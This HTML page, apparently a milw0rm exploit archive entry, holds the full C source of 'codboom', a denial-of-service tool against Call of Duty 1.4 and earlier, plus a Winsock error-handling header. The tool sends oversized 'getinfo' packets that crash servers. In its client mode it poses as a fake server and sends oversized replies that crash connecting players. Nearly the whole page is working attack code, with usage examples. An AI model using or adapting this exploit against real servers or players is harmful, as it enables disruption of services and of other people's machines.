<html>
<head>
<title>Call of Duty <= 1.4 Denial of Service</title>
<pre>
/*         winerr.h         */

/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include &lt;string.h&gt;
#include &lt;errno.h&gt;



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = &quot;Interrupted system call&quot;; break;
        case 10009: error = &quot;Bad file number&quot;; break;
        case 10013: error = &quot;Permission denied&quot;; break;
        case 10014: error = &quot;Bad address&quot;; break;
        case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
        case 10024: error = &quot;Too many open files&quot;; break;
        case 10035: error = &quot;Operation would block&quot;; break;
        case 10036: error = &quot;Operation now in progress&quot;; break;
        case 10037: error = &quot;Operation already in progress&quot;; break;
        case 10038: error = &quot;Socket operation on non-socket&quot;; break;
        case 10039: error = &quot;Destination address required&quot;; break;
        case 10040: error = &quot;Message too long&quot;; break;
        case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
        case 10042: error = &quot;Bad protocol option&quot;; break;
        case 10043: error = &quot;Protocol not supported&quot;; break;
        case 10044: error = &quot;Socket type not supported&quot;; break;
        case 10045: error = &quot;Operation not supported on socket&quot;; break;
        case 10046: error = &quot;Protocol family not supported&quot;; break;
        case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
        case 10048: error = &quot;Address already in use&quot;; break;
        case 10049: error = &quot;Can't assign requested address&quot;; break;
        case 10050: error = &quot;Network is down&quot;; break;
        case 10051: error = &quot;Network is unreachable&quot;; break;
        case 10052: error = &quot;Net dropped connection or reset&quot;; break;
        case 10053: error = &quot;Software caused connection abort&quot;; break;
        case 10054: error = &quot;Connection reset by peer&quot;; break;
        case 10055: error = &quot;No buffer space available&quot;; break;
        case 10056: error = &quot;Socket is already connected&quot;; break;
        case 10057: error = &quot;Socket is not connected&quot;; break;
        case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
        case 10059: error = &quot;Too many references, can't splice&quot;; break;
        case 10060: error = &quot;Connection timed out&quot;; break;
        case 10061: error = &quot;Connection refused&quot;; break;
        case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
        case 10063: error = &quot;File name too long&quot;; break;
        case 10064: error = &quot;Host is down&quot;; break;
        case 10065: error = &quot;No Route to Host&quot;; break;
        case 10066: error = &quot;Directory not empty&quot;; break;
        case 10067: error = &quot;Too many processes&quot;; break;
        case 10068: error = &quot;Too many users&quot;; break;
        case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
        case 10070: error = &quot;Stale NFS file handle&quot;; break;
        case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
        case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
        case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
        case 10071: error = &quot;Too many levels of remote in path&quot;; break;
        case 11001: error = &quot;Host not found&quot;; break;
        case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
        case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
        case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, &quot;\nError: %s\n&quot;, error);
    exit(1);
}

/*  codboom.c */

/*

by Luigi Auriemma

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#ifdef WIN32
    #include &lt;winsock.h&gt;
    #include &lt;io.h&gt;
    #include &lt;malloc.h&gt;
    #include &quot;winerr.h&quot;

    #define close   closesocket
#else
    #include &lt;unistd.h&gt;
    #include &lt;sys/socket.h&gt;
    #include &lt;sys/types.h&gt;
    #include &lt;arpa/inet.h&gt;
    #include &lt;netdb.h&gt;
#endif



#define VER         &quot;0.1&quot;
#define BUFFSZ      2048
#define PORT        28960
#define TIMEOUT     3
#define INFO        &quot;\xff\xff\xff\xff&quot; &quot;getinfo xxx\n&quot;
#define BOOM        &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
                        // must be major than 1023 bytes
#define SVBOF       &quot;\xff\xff\xff\xff&quot; &quot;getinfo %s\n&quot;
#define CLBOF       &quot;\xff\xff\xff\xff&quot; \
                    &quot;%sResponse\n&quot; \
                    &quot;\\g_gametype\\dm&quot; \
                    &quot;\\gamename\\Call of Duty&quot; \
                    &quot;\\mapname\\mp_carentan&quot; \
                    &quot;\\protocol\\5&quot; \
                    &quot;\\scr_friendlyfire\\0&quot; \
                    &quot;\\scr_killcam\\0&quot; \
                    &quot;\\shortversion\\1.4&quot; \
                    &quot;\\sv_allowAnonymous\\0&quot; \
                    &quot;\\sv_floodProtect\\1&quot; \
                    &quot;\\sv_hostname\\Crash&quot; \
                    &quot;\\sv_maxclients\\26&quot; \
                    &quot;\\sv_maxPing\\0&quot; \
                    &quot;\\sv_maxRate\\10000&quot; \
                    &quot;\\sv_minPing\\0&quot; \
                    &quot;\\sv_privateClients\\0&quot; \
                    &quot;\\sv_punkbuster\\1&quot; \
                    &quot;\\sv_pure\\1&quot; \
                    &quot;\\pswrd\\0&quot; \
                    &quot;\\mod\\1&quot; \
                    &quot;\\crash\\%s&quot;



void show_info(u_char *buff);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    int         sd,
                len,
                psz,
                on = 1,
                type;
    u_short     port = PORT;
    u_char      buff[BUFFSZ + 1];
    struct  sockaddr_in peer;


    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;Call of Duty &lt;= 1.4 server/client shutdown &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@altervista.org\n&quot;
        &quot;web:    http://aluigi.altervista.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 2) {
        printf(&quot;\nUsage: %s &lt;attack&gt; [port(%d)]\n&quot;
            &quot;\n&quot;
            &quot;Attack:\n&quot;
            &quot; c = broadcast clients shutdown\n&quot;
            &quot; s = server shutdown\n&quot;
            &quot;     You must add the IP or the hostname of the server after the 's'.\n&quot;
            &quot;\n&quot;
            &quot;Some usage examples:\n&quot;
            &quot;  codboom c                      listens on port %d for clients\n&quot;
            &quot;  codboom c 1234                 listens on port 1234\n&quot;
            &quot;  codboom s 192.168.0.1          tests the server 192.168.0.1 on port %d\n&quot;
            &quot;  codboom s codserver 1234       tests the server codserver on port 1234\n&quot;
            &quot;\n&quot;, argv[0], PORT, PORT, PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif    

    type = argv[1][0];
    if(type == 's') {
        if(argc &lt; 3) {
            printf(&quot;\n&quot;
                &quot;Error: you must specify the server IP or hostname.\n&quot;
                &quot;       Example: %s s localhost\n&quot;
                &quot;\n&quot;, argv[0]);
            exit(1);
        }
        peer.sin_addr.s_addr = resolv(argv[2]);
        if(argc &gt; 3) port = atoi(argv[3]);
        printf(&quot;\n- Target   %s:%hu\n&quot;,
            inet_ntoa(peer.sin_addr),
            port);

    } else if(type == 'c') {
        peer.sin_addr.s_addr = INADDR_ANY;
        if(argc &gt; 2) port = atoi(argv[2]);
        printf(&quot;\n- Listen on port %d\n&quot;, port);

    } else {
        fputs(&quot;\n&quot;
            &quot;Error: Wrong type of chosen attack.\n&quot;
            &quot;       You can choose between 2 types of attacks, passive versus clients with\n&quot;
            &quot;       'c' or versus servers with 's'\n&quot;
            &quot;\n&quot;, stdout);
        exit(1);
    }

    peer.sin_port   = htons(port);
    peer.sin_family = AF_INET;
    psz             = sizeof(peer);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd &lt; 0) std_err();

    if(type == 's') {
        fputs(&quot;- Request informations\n&quot;, stdout);
        if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&amp;peer, sizeof(peer))
          &lt; 0) std_err();
        if(timeout(sd) &lt; 0) {
            fputs(&quot;\n&quot;
                &quot;Error: socket timeout, probably the server is not online or the port is wrong\n&quot;
                &quot;\n&quot;, stdout);
            exit(1);
        }
        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
        if(len &lt; 0) std_err();
        buff[len] = 0x00;
        show_info(buff);

        fputs(&quot;- Send BOOM packet\n&quot;, stdout);
        len = sprintf(buff, SVBOF, BOOM);
        if(sendto(sd, buff, len, 0, (struct sockaddr *)&amp;peer, sizeof(peer))
          &lt; 0) std_err();

        if(timeout(sd) &lt; 0) {
            fputs(&quot;\nServer IS vulnerable!!!\n\n&quot;, stdout);
        } else {
            len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
            if(len &lt; 0) std_err();
            buff[len] = 0x00;
            printf(&quot;\n&quot;
                &quot;Server doesn't seem to be vulnerable, the following is the answer received:\n&quot;
                &quot;\n%s\n\n&quot;, buff);
        }
    } else {
        if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&amp;on, sizeof(on))
          &lt; 0) std_err();
        if(bind(sd, (struct sockaddr *)&amp;peer, sizeof(peer))
          &lt; 0) std_err();
        fputs(&quot;  Clients:\n&quot;, stdout);
        for(;;) {
            len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&amp;peer, &amp;psz);
            if(len &lt; 0) std_err();
            buff[len] = 0x00;

            printf(&quot;%16s:%hu -&gt; %s\n&quot;,
                inet_ntoa(peer.sin_addr),
                ntohs(peer.sin_port),
                buff);

            if(!memcmp(buff + 4, &quot;getinfo&quot;, 7)) {
                len = sprintf(buff, CLBOF, &quot;info&quot;, BOOM);
            } else {
                len = sprintf(buff, CLBOF, &quot;status&quot;, BOOM);
            }
            if(sendto(sd, buff, len, 0, (struct sockaddr *)&amp;peer, sizeof(peer))
              &lt; 0) std_err();
        }
    }

    close(sd);
    return(0);
}





void show_info(u_char *buff) {
    int     nt = 1;
    u_char  *string;

    while((string = strchr(buff, '\\'))) {
        *string = 0x00;
        if(!nt) {
            printf(&quot;%30s: &quot;, buff);
            nt++;
        } else {
            printf(&quot;%s\n&quot;, buff);
            nt = 0;
        }
        buff = string + 1;
    }
    printf(&quot;%s\n&quot;, buff);
}




int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&amp;fd_read);
    FD_SET(sock, &amp;fd_read);
    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout);
    if(err &lt; 0) std_err();
    if(!err) return(-1);
    return(0);
}




u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf(&quot;\nError: Unable to resolv hostname (%s)\n&quot;, host);
            exit(1);
        } else host_ip = *(u_long *)(hp-&gt;h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror(&quot;\nError&quot;);
        exit(1);
    }
#endif</pre>
//milw0rm.com
</html>

